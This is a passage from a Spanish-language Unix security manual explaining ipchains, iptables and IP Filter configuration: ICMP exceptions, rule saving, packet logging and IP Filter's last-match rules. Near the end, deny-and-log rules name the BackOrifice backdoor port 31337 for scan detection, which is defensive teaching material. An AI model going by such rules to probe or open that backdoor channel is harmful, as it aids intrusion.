tr&#x00E1;&#xFB01;co de entrada est&#x00E1; siendo denegado gracias a la pol&#x02CA;&#x0131;tica por defecto que hemos establecido
para la chain input (DENY). As&#x02CA;&#x0131;, tr&#x00E1;&#xFB01;co como los mensajes ICMP de vuelta, o las llamadas al
servicio ident que realizan ciertos servidores cuando se les solicita una conexi&#x00F3;n no alcanzar&#x00E1;n su
destino, lo cual puede repercutir en la funcionalidad de nuestro entorno: simplemente hemos de
pensar en una comprobaci&#x00F3;n rutinaria de conectividad v&#x02CA;&#x0131;a ping o en el acceso a un servidor FTP
externo que sea denegado si no se consigue la identidad del usuario remoto. Para evitar estos
problemas, podemos permitir el tr&#x00E1;&#xFB01;co de ciertos paquetes ICMP y el acceso al servicio auth (puerto
113):

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-A&#x00A0;input&#x00A0;-p&#x00A0;icmp&#x00A0;--icmp-type&#x00A0;&#x005C;
&#x00A0;&#x003E;&#x00A0;destination-unreachable&#x00A0;-j&#x00A0;ACCEPT
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-A&#x00A0;input&#x00A0;-p&#x00A0;icmp&#x00A0;--icmp-type&#x00A0;source-quench&#x00A0;-j&#x00A0;ACCEPT
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-A&#x00A0;input&#x00A0;-p&#x00A0;icmp&#x00A0;--icmp-type&#x00A0;time-exceeded&#x00A0;-j&#x00A0;ACCEPT
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-A&#x00A0;input&#x00A0;-p&#x00A0;icmp&#x00A0;--icmp-type&#x00A0;parameter-problem&#x00A0;&#x005C;
&#x00A0;&#x003E;&#x00A0;-j&#x00A0;ACCEPT
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-A&#x00A0;input&#x00A0;-p&#x00A0;icmp&#x00A0;--icmp-type&#x00A0;echo-reply&#x00A0;-j&#x00A0;ACCEPT
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-A&#x00A0;input&#x00A0;-p&#x00A0;tcp&#x00A0;-j&#x00A0;ACCEPT&#x00A0;-d&#x00A0;158.42.22.41&#x00A0;113
&#x00A0;luisa:~#
</literallayout>
<!--l. 667--><para>Como vemos, hemos ido de&#xFB01;niendo las reglas que conforman nuestra pol&#x02CA;&#x0131;tica desde l&#x02CA;&#x0131;nea de comando; ya
hemos comentado que toda esta con&#xFB01;guraci&#x00F3;n se pierde al detener el sistema, por lo que es necesario crear
un script que las vuelva a generar y plani&#xFB01;carlo para que se ejecute en el arranque de la m&#x00E1;quina.
Para ello no tenemos que escribir l&#x02CA;&#x0131;nea a l&#x02CA;&#x0131;nea la con&#xFB01;guraci&#x00F3;n vista en este punto (mejor, la
con&#xFB01;guraci&#x00F3;n adecuada a nuestro entorno), o utilizar ipchains-restore o iptables-restore para
leer esa con&#xFB01;guraci&#x00F3;n de un &#xFB01;chero; si elegimos esta opci&#x00F3;n, antes de detener al sistema hemos
de ejecutar ipchains-save o iptables-save para guardar dicha pol&#x02CA;&#x0131;tica en el &#xFB01;chero que
posteriormente leeremos. De esta forma, en la parada de la m&#x00E1;quina hemos de ejecutar una orden similar
a:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains-save&#x00A0;&#x003E;/etc/rc.d/policy
&#x00A0;Saving&#x00A0;&#x2018;input&#x2019;.
&#x00A0;luisa:~#
</literallayout>
<!--l. 686--><para>Mientras que en el arranque, en nuestro script cargaremos la pol&#x02CA;&#x0131;tica guardada al detener la m&#x00E1;quina con una
orden como:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains-restore&#x00A0;&#x003C;/etc/rc.d/policy
&#x00A0;luisa:~#
</literallayout>
<!--l. 694--><para>
  </para></section><!--end subsection--><!--l. 694--><section 
role="subsection"><title><abbrev role="title-mark">16.2.4</abbrev><anchor 
   id="x1-25300016.2.4"  ></anchor>El sistema de log</title>
<!--l. 695--><para>  Evidentemente, tanto ipchains como iptables est&#x00E1;n preparados para generar logs en el
sistema: ambos permiten registrar mediante syslogd los paquetes que cumplan cierta regla &#x2013; por
norma general, todos &#x2013;. Un registro exhaustivo de las acciones que se toman en el n&#x00FA;cleo con
respecto al &#xFB01;ltrado de paquetes no es conveniente: la gran cantidad de informaci&#x00F3;n guardada hace
imposible detectar actividades sospechosas, y adem&#x00E1;s no es dif&#x02CA;&#x0131;cil que se produzcan ataques de
negaci&#x00F3;n de servicio, ya sea por disco ocupado o por tiempo consumido en generar y guardar
registros. Por tanto, lo habitual es almacenar s&#x00F3;lamente los paquetes que no sean rutinarios
(por ejemplo, intentos de conexi&#x00F3;n desde direcciones no autorizadas, ciertos paquetes ICMP no
habituales&#x2026;).
<!--br/-->
<!--br/-->En el caso de ipchains el n&#x00FA;cleo de Linux, a trav&#x00E9;s de klogd y de syslogd, registra estos eventos con
prioridad &#x2018;info&#x2019;, y al provenir del kernel (no olvidemos que el subsitema de &#xFB01;ltrado forma parte del n&#x00FA;cleo
del operativo), su tipo es obviamente &#x2018;kernel&#x2019;. Para que cuando un paquete haga match con una regla se
genere un registro hemos de utilizar la opci&#x00F3;n &#x2018;-l&#x2019;; por ejemplo, si deseamos que cada vez que alguien
intente hacer un finger contra la m&#x00E1;quina el tr&#x00E1;&#xFB01;co, aparte de ser denegado, registre un log, ejecutaremos
una orden como la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/ipchains&#x00A0;-A&#x00A0;input&#x00A0;-p&#x00A0;tcp&#x00A0;-j&#x00A0;DENY&#x00A0;-l&#x00A0;-s&#x00A0;0.0.0.0/0&#x00A0;&#x005C;
&#x00A0;&#x003E;&#x00A0;-d&#x00A0;158.42.22.41&#x00A0;79
&#x00A0;luisa:~#
</literallayout>
<!--l. 723--><para>As&#x02CA;&#x0131;, si estos registros se almacenan en el &#xFB01;chero /var/adm/fwdata, sus entradas ser&#x00E1;n de la siguiente
forma:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;tail&#x00A0;-1&#x00A0;/var/adm/fwdata
&#x00A0;Apr&#x00A0;&#x00A0;3&#x00A0;02:03:13&#x00A0;rosita&#x00A0;kernel:&#x00A0;Packet&#x00A0;log:&#x00A0;input&#x00A0;DENY&#x00A0;eth0&#x00A0;PROTO=6&#x00A0;&#x005C;
&#x00A0;&#x00A0;158.42.2.1:1032&#x00A0;158.42.22.41:79&#x00A0;L=34&#x00A0;S=0x00&#x00A0;I=18&#x00A0;F=0x0000&#x00A0;T=254
&#x00A0;rosita:~#
</literallayout>
<!--l. 733--><para>El anterior mensaje nos dice principalmente que un paquete con protocolo 6 (corresponde a TCP en nuestro
archivo /etc/protocols) proveniente de la direcci&#x00F3;n 158.42.2.1 y destinado a nuestro servicio
finger ha sido denegado; el resto de la informaci&#x00F3;n no la veremos aqu&#x02CA;&#x0131; (se puede consultar la
documentaci&#x00F3;n del producto para ver el signi&#xFB01;cado concreto de todos y cada uno de los campos
registrados).
<!--br/-->
<!--br/-->En el caso de iptables el registro de eventos generado por el subsistema de &#xFB01;ltrado es algo diferente al de
ipchains, tanto al hablar de su funcionamiento como de su sintaxis. Ahora el log se realiza a trav&#x00E9;s de un
target independiente (LOG) que registra las tramas que hacen match con una regla determinada, y la
prioridad de registro ya no es &#x2018;info&#x2019; sino que se puede indicar en la propia l&#x02CA;&#x0131;nea de &#x00F3;rdenes (por defecto es
&#x2018;warning&#x2019;). Adem&#x00E1;s, se ha de&#xFB01;nido una nueva extensi&#x00F3;n denominada &#x2018;limit&#x2019; que permite restringir el
n&#x00FA;mero de registros que una regla puede generar por unidad de tiempo, lo cual es evidentemente &#x00FA;til para
evitar que alguien ataque con &#x00E9;xito nuestros recursos mediante un &#xFB02;ood del log en el subsistema de
&#xFB01;ltrado.
<!--br/-->
<!--br/-->Volvamos de nuevo al ejemplo anterior, en el que registr&#x00E1;bamos los intentos de acceso a nuestro puerto
79 (finger) para tener constancia de cu&#x00E1;ndo alguien trataba de obtener informaci&#x00F3;n de los
usuarios de nuestro sistema; en el caso de iptables deber&#x02CA;&#x0131;amos de&#xFB01;nir una regla como la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;/sbin/iptables&#x00A0;-A&#x00A0;INPUT&#x00A0;-p&#x00A0;TCP&#x00A0;-m&#x00A0;limit&#x00A0;-j&#x00A0;LOG&#x00A0;--log-prefix&#x00A0;&#x005C;
&#x00A0;&#x003E;&#x00A0;&#x0022;FINGER&#x00A0;ATTEMPT:&#x0022;&#x00A0;-d&#x00A0;158.42.22.41&#x00A0;--dport&#x00A0;79
&#x00A0;luisa:~#
</literallayout>
<!--l. 762--><para>Lo que indicamos mediante esta orden es que genere un mensaje cada vez que alguien env&#x02CA;&#x0131;e tr&#x00E1;&#xFB01;co al puerto
79 de la direcci&#x00F3;n 158.42.22.41 (esto es, cada vez que alguien haga finger contra la m&#x00E1;quina).
Podemos observar que ahora de&#xFB01;nimos el target LOG (opci&#x00F3;n &#x2018;-j&#x2019;), y que adem&#x00E1;s aplicamos
la extensi&#x00F3;n &#x2018;limit&#x2019; (par&#x00E1;metro &#x2018;-m&#x2019;) para limitar el registro y evitar as&#x02CA;&#x0131; ciertas negaciones
de servicio; cada vez que esta regla genere un log a~nadir&#x00E1; al principio del mismo la cadena
&#x2018;FINGER ATTEMPT:&#x2019;, lo que nos permite identi&#xFB01;car de una forma m&#x00E1;s clara el mensaje. Podemos
&#xFB01;jarnos en que a trav&#x00E9;s de esta regla no estamos ni aceptando ni negando el tr&#x00E1;&#xFB01;co, sino s&#x00F3;lo
registrando su existencia: para detener la trama, hemos de indicarlo expl&#x02CA;&#x0131;citamente o bien a
trav&#x00E9;s de la acci&#x00F3;n por defecto que hayamos especi&#xFB01;cado para la chain INPUT (mediante la opci&#x00F3;n
&#x2018;-P&#x2019;).
  </para></section><!--end subsection--></section><!--end section--><!--l. 775--><section 
role="section"><title><abbrev role="title-mark">16.3</abbrev><anchor 
   id="x1-25400016.3"  ></anchor>IPFilter</title>
<!--l. 776--><para>
  </para><!--l. 776--><section 
role="subsection"><title><abbrev role="title-mark">16.3.1</abbrev><anchor 
   id="x1-25500016.3.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 777--><para>  IP Filter (http://coombs.anu.edu.au/~avalon/ip-filter.html) es un cortafuegos disponible para
muchos clones de Unix (Solaris, IRIX, FreeBSD, NetBSD, HP-UX&#x2026;); su precio (se trata de un software
gratuito) y sus excelentes caracter&#x02CA;&#x0131;sticas t&#x00E9;cnicas lo han convertido en una soluci&#x00F3;n muy interesante para
entornos medios donde otros cortafuegos como Firewall&#x2013;1 no resultan apropiados por diferentes razones:
incluso en Solaris puede ser (&#x00BF;es?) en muchos casos una alternativa m&#x00E1;s interesante que SunScreen Lite, de
la propia Sun Microsystems.
<!--br/-->
<!--br/-->Este cortafuegos permite &#xFB01;ltrar el tr&#x00E1;&#xFB01;co en funci&#x00F3;n de diferentes campos de la cabecera IP de una trama,
como las clases de seguridad, las direcciones origen y destino y el protocolo (obvio) o diferentes
bits de estado. Adem&#x00E1;s es posible utilizarlo como redirector de tr&#x00E1;&#xFB01;co para con&#xFB01;gurar proxies
transparentes, efectuar NAT e IP Accounting, y ofrece tambi&#x00E9;n mecanismos de comunicaci&#x00F3;n
con el espacio de usuario; por si todo esto fuera poco, IP Filter es stateful y soporta adem&#x00E1;s
IPv6.
<!--br/-->
<!--br/-->No obstante, no todo es positivo; el argumento m&#x00E1;s utilizado por los detractores de IP Filter no es t&#x00E9;cnico
sino jur&#x02CA;&#x0131;dico, pero en cualquier caso vale la pena comentarlo: se trata del tipo de licencia, o de la
interpretaci&#x00F3;n de la misma, que hace el autor del software (el australiano Darren Reed), y que
aunque distribuye el c&#x00F3;digo fuente de forma gratuita, no permite efectuar modi&#xFB01;caciones sobre
el mismo. Aunque parezca una tonter&#x02CA;&#x0131;a, esta postura choca frontalmente con la &#xFB01;losof&#x02CA;&#x0131;a de
diferentes sistemas Unix para los que el producto est&#x00E1; disponible, lo que ha generado problemas de
distribuci&#x00F3;n y utilizaci&#x00F3;n del mismo; el ejemplo m&#x00E1;s extremo es el de OpenBSD, que por indicaci&#x00F3;n
expresa del mism&#x02CA;&#x0131;simo Theo de Raadt elimin&#x00F3; IP Filter de sus distribuciones en Mayo de 2001 y
comenz&#x00F3; desde entonces el desarrollo de pf, similar al anterior pero liberado bajo otro tipo de
licencia.
  </para></section><!--end subsection--><!--l. 806--><section 
role="subsection"><title><abbrev role="title-mark">16.3.2</abbrev><anchor 
   id="x1-25600016.3.2"  ></anchor>Instalaci&#x00F3;n</title>
<!--l. 807--><para>  IP Filter no se distribuye o&#xFB01;cialmente en formato binario (en forma de paquete), por lo que el c&#x00F3;digo ha
de ser compilado antes de ser utilizado; de cualquier forma, su instalaci&#x00F3;n en un sistema Unix suele ser muy
sencilla: por ejemplo, en el caso de Solaris, la &#x00FA;nica precauci&#x00F3;n a tener en cuenta es que GNU CC (gcc) no

puede compilar IP Filter en modo 64 bits, por lo que ser&#x00E1; necesario utilizar el compilador de Sun
Microsystems o, en su defecto, EGCS. En cualquier caso, los pasos a seguir una vez descargado el archivo
.tar.gz <anchor 
   id="x1-256001f2"  ></anchor><footnote><para>   Es recomendable utilizar la versi&#x00F3;n 3.4.17 del producto o superior, ya que versiones anteriores presentan un grave
problema de seguridad que hoy mismo (6 de abril de 2001) ha sido anunciado en BUGTRAQ.</para></footnote>
son los siguientes:

     </para><literallayout role="verbatim">
&#x00A0;anita:/var/tmp#&#x00A0;gzip&#x00A0;-dc&#x00A0;ip-fil3.4.17.tar.gz&#x00A0;|tar&#x00A0;xf&#x00A0;-
&#x00A0;anita:/var/tmp#&#x00A0;cd&#x00A0;ip&#x005F;fil3.4.17
&#x00A0;anita:/var/tmp/ip&#x005F;fil3.4.17#&#x00A0;/usr/xpg4/bin/make&#x00A0;solaris
&#x00A0;anita:/var/tmp/ip&#x005F;fil3.4.17#&#x00A0;cd&#x00A0;SunOS5
&#x00A0;anita:/var/tmp/ip&#x005F;fil3.4.17/SunOS5#&#x00A0;/usr/xpg4/bin/make&#x00A0;package
</literallayout>
<!--l. 828--><para>La &#x00FA;ltima de estas &#x00F3;rdenes crear&#x00E1; y a~nadir&#x00E1; autom&#x00E1;ticamente un paquete con el cortafuegos en nuestro sistema.
Podemos comprobar que est&#x00E1; correctamente instalado con la orden pkginfo:

     </para><literallayout role="verbatim">
&#x00A0;anita:/var/tmp#&#x00A0;pkginfo&#x00A0;-l&#x00A0;ipf
&#x00A0;&#x00A0;&#x00A0;&#x00A0;PKGINST:&#x00A0;&#x00A0;ipf
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;NAME:&#x00A0;&#x00A0;IP&#x00A0;Filter
&#x00A0;&#x00A0;&#x00A0;CATEGORY:&#x00A0;&#x00A0;system
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ARCH:&#x00A0;&#x00A0;i386
&#x00A0;&#x00A0;&#x00A0;&#x00A0;VERSION:&#x00A0;&#x00A0;3.4.17
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;VENDOR:&#x00A0;&#x00A0;Darren&#x00A0;Reed
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;DESC:&#x00A0;&#x00A0;This&#x00A0;package&#x00A0;contains&#x00A0;tools&#x00A0;for&#x00A0;building&#x00A0;a&#x00A0;firewall
&#x00A0;&#x00A0;&#x00A0;INSTDATE:&#x00A0;&#x00A0;Apr&#x00A0;06&#x00A0;2001&#x00A0;19:10
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;EMAIL:&#x00A0;&#x00A0;darrenr@pobox.com
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;STATUS:&#x00A0;&#x00A0;completely&#x00A0;installed
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;FILES:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;80&#x00A0;installed&#x00A0;pathnames
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;12&#x00A0;shared&#x00A0;pathnames
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1&#x00A0;linked&#x00A0;files
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;24&#x00A0;directories
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;11&#x00A0;executables
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;21441&#x00A0;blocks&#x00A0;used&#x00A0;(approx)
&#x00A0;
&#x00A0;anita:/var/tmp#
</literallayout>
<!--l. 854--><para>Tras instalar el paquete, de&#xFB01;niremos las reglas de &#xFB01;ltrado y NAT en los archivos correspondientes (tal y
como veremos a continuaci&#x00F3;n), y una vez hecho esto ya podremos inicializar nuestro &#xFB01;rewall con la orden
/etc/init.d/ipfboot start, que podemos incluir en el arranque de nuestra m&#x00E1;quina de la forma
habitual.
<!--br/-->
<!--br/-->Si le pegamos un vistazo a este shellscript de inicializaci&#x00F3;n del cortafuegos, generado al instalar el paquete
ipf (en Solaris, /etc/init.d/ipfboot) podemos observar que en sus primeras l&#x02CA;&#x0131;neas se de&#xFB01;nen los
&#xFB01;cheros en los que se guardar&#x00E1;n las reglas a instalar, tanto para &#xFB01;ltrado como para traducci&#x00F3;n de direcciones.
Se trata de simples archivos ASCII ubicados por defecto en el directorio /etc/opt/ipf/ que podemos
modi&#xFB01;car con nuestro editor preferido, aunque tambi&#x00E9;n podemos utilizar c&#x00F3;modos interfaces gr&#x00E1;&#xFB01;cos como
fwbuilder (que ya hemos comentado al hablar de iptables e ipchains), capaces de generar reglas
tambi&#x00E9;n para IP Filter.
  </para></section><!--end subsection--><!--l. 870--><section 
role="subsection"><title><abbrev role="title-mark">16.3.3</abbrev><anchor 
   id="x1-25700016.3.3"  ></anchor>Gesti&#x00F3;n</title>
<!--l. 871--><para>  Como ya hemos comentado, una de las grandes diferencias de IP Filter con respecto a otros sistemas
cortafuegos es que este toma su con&#xFB01;guraci&#x00F3;n &#x2013; su pol&#x02CA;&#x0131;tica &#x2013; de simples &#xFB01;cheros ASCII; realmente esto es
una diferencia importante con respecto a otros sistemas cortafuegos, como iptables, que no est&#x00E1;n
orientados a archivo: un script de arranque de IP Filter instala pol&#x02CA;&#x0131;ticas le&#x02CA;&#x0131;das del &#xFB01;chero correspondiente,
que posee una cierta sintaxis, mientras que uno de iptables ejecuta l&#x02CA;&#x0131;nea a l&#x02CA;&#x0131;nea &#x00F3;rdenes que conforman la
pol&#x02CA;&#x0131;tica a implantar.
<!--br/-->
<!--br/-->El hecho de que IP Filter est&#x00E9; orientado a archivo es principalmente una cuesti&#x00F3;n de dise~no,
pero no tanto de gesti&#x00F3;n; la segunda &#x2013; pero quiz&#x00E1;s la m&#x00E1;s importante &#x2013; diferencia de IP Filter
con respecto a casi todo el resto de &#xFB01;rewalls del mercado s&#x02CA;&#x0131; que es puramente relativa a su
gesti&#x00F3;n, y la encontramos a la hora de implantar en el cortafuegos la pol&#x02CA;&#x0131;tica de seguridad
de&#xFB01;nida en nuestro entorno de trabajo: se trata del orden de procesamiento de las reglas de IP
Filter, completamente diferente a Firewall-1, ipchains o iptables. En todos estos &#xFB01;rewalls
se analizan en orden las reglas instaladas hasta que una coincide con el tipo de tr&#x00E1;&#xFB01;co sobre
el que actuar (como se dice habitualmente, hasta que hace match); en ese momento ya no
se analizan m&#x00E1;s reglas, sino que se aplica la acci&#x00F3;n determinada por la regla coincidente. IP
Filter no sigue este esquema; por contra, se suelen (digo &#x2018;se suelen&#x2019; porque se puede forzar un

comportamiento diferente) procesar todas las reglas de&#xFB01;nidas en nuestra con&#xFB01;guraci&#x00F3;n, desde la
primera a la &#x00FA;ltima, y se aplica la &#x00FA;ltima coincidente con el tipo de tr&#x00E1;&#xFB01;co sobre el que se va a
actuar. Como esta forma de trabajar puede resultar al principio algo confusa (especialmente
para la gente que ha trabajado con otros cortafuegos), veamos un ejemplo que aclare un poco
nuestras ideas; imaginemos un conjunto de reglas como el siguiente (utilizando una nomenclatura
gen&#x00E9;rica):

     </para><literallayout role="verbatim">
&#x00A0;&#x00A0;&#x00A0;Origen&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Destino&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Tipo&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Puerto&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Accion
&#x00A0;----------------------------------------------------------------------
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Allow
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Deny
</literallayout>
<!--l. 909--><para>Si un administrador de Firewall&#x2013;1 ve esta pol&#x02CA;&#x0131;tica implantada en su cortafuegos seguramente se llevar&#x00E1; las
manos a la cabeza, ya que este &#xFB01;rewall interpretar&#x00E1; &#x00FA;nicamente la primera regla: como cualquier tr&#x00E1;&#xFB01;co
coincide con ella, es la &#x00FA;nica que se aplicar&#x00E1;; de esta forma, la pol&#x02CA;&#x0131;tica anterior dejar&#x02CA;&#x0131;a pasar todo el tr&#x00E1;&#xFB01;co
hacia y desde nuestra red (algo que evidentemente no es ni recomendable ni pr&#x00E1;ctico, porque es
exactamente lo mismo que no tener ning&#x00FA;n &#xFB01;rewall).
<!--br/-->
<!--br/-->En cambio, IP Filter no sigue este mecanismo; el software procesar&#x00E1; ambas reglas, y aplicar&#x00E1; la &#x00FA;ltima que
coincida con el tipo de tr&#x00E1;&#xFB01;co sobre el que se quiere actuar; como la segunda y &#x00FA;ltima regla coincidir&#x00E1; con
todo el tr&#x00E1;&#xFB01;co que circule por el cortafuegos, ser&#x00E1; la que se aplicar&#x00E1; siempre: en de&#xFB01;nitiva, todo ser&#x00E1; parado
por el &#xFB01;rewall (aunque esto ser&#x02CA;&#x0131;a evidentemente muy bene&#xFB01;cioso para nuestra seguridad, en la pr&#x00E1;ctica es
impensable: equivale a desconectar a cada sistema, o al menos a cada segmento, del resto de la
red).
<!--br/-->
<!--br/-->Teniendo en cuenta esta peculiaridad del software, ya podemos comenzar a de&#xFB01;nir nuestra pol&#x02CA;&#x0131;tica de
&#xFB01;ltrado en el &#xFB01;chero correspondiente; como siempre, por seguridad vamos a denegar todo el tr&#x00E1;&#xFB01;co que no
est&#x00E9; expl&#x02CA;&#x0131;citamente autorizado, por lo que la primera regla del archivo ser&#x00E1; justamente la que
niegue todo, y a continuaci&#x00F3;n se de&#xFB01;nir&#x00E1;n m&#x00E1;s entradas contemplando el tr&#x00E1;&#xFB01;co que deseamos
permitir:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;head&#x00A0;-4&#x00A0;/etc/opt/ipf/ipf.conf
&#x00A0;#####
&#x00A0;#&#x00A0;Bloqueamos&#x00A0;todo&#x00A0;lo&#x00A0;que&#x00A0;no&#x00A0;se&#x00A0;permita&#x00A0;explicitamente
&#x00A0;#####
&#x00A0;block&#x00A0;in&#x00A0;all
&#x00A0;anita:/#
</literallayout>
<!--l. 940--><para>Esta regla viene a decir que se bloquee (&#x2018;block&#x2019;) todo el tr&#x00E1;&#xFB01;co (&#x2018;all&#x2019;) de entrada (&#x2018;in&#x2019;) al sistema; como
podemos ver, una de las ventajas de este cortafuegos, orientado a archivo, es que la sintaxis del &#xFB01;chero de
con&#xFB01;guraci&#x00F3;n es extremadamente sencilla: al menos al nivel m&#x00E1;s b&#x00E1;sico, casi &#x00FA;nicamente sabiendo ingl&#x00E9;s
podemos deducir qu&#x00E9; hace cada regla, a diferencia de ipchains o ipfilter y sus opciones, que a decir
verdad no son precisamente inmediatas&#x2026;
<!--br/-->
<!--br/-->Una vez negado todo el tr&#x00E1;&#xFB01;co que no habilitemos expl&#x02CA;&#x0131;citamente ya podemos comenzar a de&#xFB01;nir las
reglas que acepten tramas; como en el anterior ejemplo, imaginemos que deseamos permitir
todo el tr&#x00E1;&#xFB01;co web cuyo destino sea la direcci&#x00F3;n 158.42.22.41, as&#x02CA;&#x0131; como los accesos SSH a esta
misma IP desde la 158.42.2.1. Para conseguirlo, de&#xFB01;niremos un par de reglas similares a las
siguientes:

     </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;HTTP
&#x00A0;pass&#x00A0;in&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;any&#x00A0;to&#x00A0;158.42.22.41&#x00A0;port&#x00A0;=&#x00A0;80
&#x00A0;#&#x00A0;SSH
&#x00A0;pass&#x00A0;in&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;158.42.2.1&#x00A0;to&#x00A0;158.42.22.41&#x00A0;port&#x00A0;=&#x00A0;22
</literallayout>
<!--l. 961--><para>Podemos seguir viendo la facilidad para interpretar la sintaxis del archivo: estamos permitiendo (&#x2018;pass&#x2019;) el
tr&#x00E1;&#xFB01;co de entrada (&#x2018;in&#x2019;) por el interfaz elxl0 desde cualquier sitio (&#x2018;from any&#x2019;, en el caso de HTTP) o
desde una direcci&#x00F3;n concreta (en el caso de SSH) a los puertos correspondientes de la m&#x00E1;quina destino (&#x2018;to
158.42.22.41&#x2019;). Una vez hecho esto &#x2013; realmente, las reglas que vamos a comentar a continuaci&#x00F3;n
deber&#x02CA;&#x0131;amos ubicarlas antes que las reglas &#x2018;pass&#x2019; en un sistema real, pero a efectos de comprender la
sintaxis de IP Filter esto es irrelevante &#x2013; vamos a de&#xFB01;nir ciertas reglas para bloquear y detectar ataques,
que adem&#x00E1;s nos van a servir para introducir la directiva &#x2018;quick&#x2019;. Al igual que hac&#x02CA;&#x0131;amos sobre nuestro
&#xFB01;rewall Linux, vamos a bloquear el tr&#x00E1;&#xFB01;co dirigido a ciertos puertos sospechosos, como 31337
(BackOri&#xFB01;ce), 79 (finger) o 7 (echo); adem&#x00E1;s, nos interesa bloquear tambi&#x00E9;n el tr&#x00E1;&#xFB01;co que entre por el
interfaz externo (donde se supone que est&#x00E1; Internet) y provenga de redes que no est&#x00E1;n pinchadas
en este interfaz. En conseguir ambos objetivos, usaremos un conjunto de reglas similar al
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;#####
&#x00A0;##&#x00A0;LOG&#x00A0;de&#x00A0;escaneos
&#x00A0;#####
&#x00A0;block&#x00A0;in&#x00A0;log&#x00A0;quick&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;any&#x00A0;to&#x00A0;any&#x00A0;port&#x00A0;=&#x00A0;31337
&#x00A0;block&#x00A0;in&#x00A0;log&#x00A0;quick&#x00A0;on&#x00A0;elxl0&#x00A0;from&#x00A0;any&#x00A0;to&#x00A0;any&#x00A0;port&#x00A0;=&#x00A0;79
&#x00A0;
&#x00A0;#####
